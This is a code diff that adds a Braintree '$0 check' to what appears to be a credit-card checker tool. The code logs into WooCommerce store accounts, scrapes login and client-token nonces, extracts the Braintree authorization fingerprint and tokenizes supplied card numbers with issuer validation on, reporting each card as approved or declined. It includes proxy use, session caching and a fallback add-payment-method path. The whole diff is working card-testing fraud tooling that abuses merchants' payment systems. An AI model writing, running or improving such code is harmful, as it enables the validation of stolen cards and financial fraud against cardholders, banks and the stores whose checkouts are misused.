@@ -316,7 +316,13 @@ async def _get_bt_auth(client, checkout_html, site_url=None):
     return None
 
 
-async def _tokenize_card(client, auth, cc, mm, yy, cvv):
+async def _tokenize_card(client, auth, cc, mm, yy, cvv, validate=False):
+    """Turn the card into a payment method.
+
+    With validate turned on, braintree asks the issuer about the card
+    while it makes the token, so a card the issuer refuses gives no
+    token and the reason comes back with it.  That is the $0 check.
+    """
     bt_headers = {
         "authorization": f"Bearer {auth}",
         "braintree-version": "2018-05-10",
@@ -340,7 +346,7 @@ async def _tokenize_card(client, auth, cc, mm, yy, cvv):
                     "expirationYear": yy,
                     "cvv": cvv,
                 },
-                "options": {"validate": False},
+                "options": {"validate": bool(validate)},
             }
         },
     }
@@ -352,6 +358,12 @@ async def _tokenize_card(client, auth, cc, mm, yy, cvv):
     data = r.json()
     if "errors" in data and data["errors"]:
         msg = data["errors"][0].get("message", "Tokenization failed")
+        for item in (data["errors"][0].get("data") or []):
+            if isinstance(item, dict):
+                code = item.get("code") or ""
+                detail = item.get("message") or ""
+                if code or detail:
+                    msg = f"{code} {detail}".strip() or msg
         return None, None, msg
 
     cc_data = data.get("data", {}).get("tokenizeCreditCard", {})
@@ -754,6 +766,110 @@ def _strip_verdict_word(text):
     return out
 
 
+async def _token_check(client, site, cc, mm, yy, cvv):
+    """Ask braintree whether the card can be used, and say what it said.
+
+    The card is turned into a payment method with the check turned on, so
+    braintree asks the issuer while it makes the token.  A card the issuer
+    refuses gives no token, and the reason comes back with it.  Nothing
+    is charged, so this is a $0 check.
+
+    Returns (verdict, detail, card_info) or (None, reason, None) when the
+    store could not be asked at all.
+    """
+    base = site.get("url", "")
+    headers_page = {
+        "User-Agent": UA,
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9",
+    }
+
+    def _logged_in():
+        return any(c.startswith("wordpress_logged_in") for c in client.cookies.keys())
+
+    cache_key = base
+    cached = _cache_get(cache_key)
+
+    if cached:
+        for name, value in (cached.get("cookies") or {}).items():
+            try:
+                client.cookies.set(name, value)
+            except Exception:
+                pass
+        if not _logged_in():
+            cached = None
+    if not cached:
+        r = await client.get(f"{base}/my-account/", headers=headers_page)
+        if r.status_code != 200:
+            return None, f"the account page answered {r.status_code}", None
+        m = re.search(r'name=["\']woocommerce-login-nonce["\'][^>]*value=["\']([^"\']+)', r.text)
+        if not m:
+            return None, "the store gave no login nonce", None
+        r = await client.post(
+            f"{base}/my-account/",
+            headers={**headers_page, "Content-Type": "application/x-www-form-urlencoded",
+                     "Origin": base, "Referer": f"{base}/my-account/"},
+            data={"username": site.get("user", ""), "password": site.get("password", ""),
+                  "rememberme": "forever", "woocommerce-login-nonce": m.group(1),
+                  "_wp_http_referer": "/my-account/", "login": "Log in"})
+        if not _logged_in():
+            return None, "the store did not accept the login", None
+
+    if cached:
+        fingerprint = cached.get("fingerprint", "")
+    else:
+        r = await client.get(f"{base}/my-account/add-payment-method/",
+                             headers={**headers_page,
+                                      "Referer": f"{base}/my-account/payment-methods/"})
+        if r.status_code != 200:
+            return None, f"the add payment method page answered {r.status_code}", None
+        html = r.text
+        ctn = re.search(r'"client_token_nonce"\s*:\s*"([^"]+)"', html)
+        ctn = ctn.group(1) if ctn else ""
+        if not ctn:
+            return None, "the store gave no client token nonce", None
+        r = await client.post(
+            f"{base}/wp-admin/admin-ajax.php",
+            headers={**headers_page,
+                     "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                     "Origin": base, "Referer": f"{base}/my-account/add-payment-method/",
+                     "X-Requested-With": "XMLHttpRequest"},
+            data={"action": (site.get("client_token_action")
+                            or "wc_braintree_credit_card_get_client_token"),
+                  "nonce": ctn, "security": ctn})
+        try:
+            raw = r.json().get("data")
+        except Exception:
+            raw = None
+        if isinstance(raw, dict):
+            raw = raw.get("clientToken")
+        try:
+            fingerprint = json.loads(base64.b64decode(raw))["authorizationFingerprint"]
+        except Exception:
+            return None, "the client token could not be read", None
+        try:
+            _cache_put(cache_key, {
+                "cookies": {c.name: c.value for c in client.cookies.jar},
+                "fingerprint": fingerprint,
+            })
+        except Exception:
+            pass
+
+    token, card_info, err = await _tokenize_card(client, fingerprint, cc, mm, yy, cvv,
+                                                  validate=True)
+    if not token:
+        # braintree said no, and it said why
+        reason = err or "the card was not accepted"
+        verdict, wording = _verdict_from_reason(reason)
+        if verdict in ("Approved", "Wait"):
+            verdict = "Declined"
+        return verdict, wording or reason[:80], card_info or None
+
+    # The token was made with the check on, so braintree took the card
+    # and said yes.  Nothing was charged.
+    return "Approved", "Accepted by Braintree (no charge)", card_info
+
+
 async def _wc_account_check(client, site, cc, mm, yy, cvv):
     """Add the card as a payment method on a WooCommerce account.
 
@@ -1050,8 +1166,20 @@ async def _check_card_braintree_run(cc, mm, yy, cvv, proxy=None):
                 for attempt in (1, 2):
                     elapsed = round(time.time() - start, 2)
                     try:
-                        verdict, detail, card_info = await _wc_account_check(
-                            client, account, cc, mm, yy, cvv)
+                        # The card is checked while the token is made, so
+                        # braintree asks the issuer and nothing is
+                        # charged.  The store that takes the card as a
+                        # payment method is the second try, for when the
+                        # store will not check the card.
+                        if os.environ.get("B3_USE_TOKEN_CHECK", "1").strip() == "1":
+                            verdict, detail, card_info = await _token_check(
+                                client, account, cc, mm, yy, cvv)
+                            if not verdict:
+                                verdict, detail, card_info = await _wc_account_check(
+                                    client, account, cc, mm, yy, cvv)
+                        else:
+                            verdict, detail, card_info = await _wc_account_check(
+                                client, account, cc, mm, yy, cvv)
                     except Exception as e:
                         verdict, detail, card_info = None, f"{type(e).__name__}: {str(e)[:60]}", None
                     if verdict:
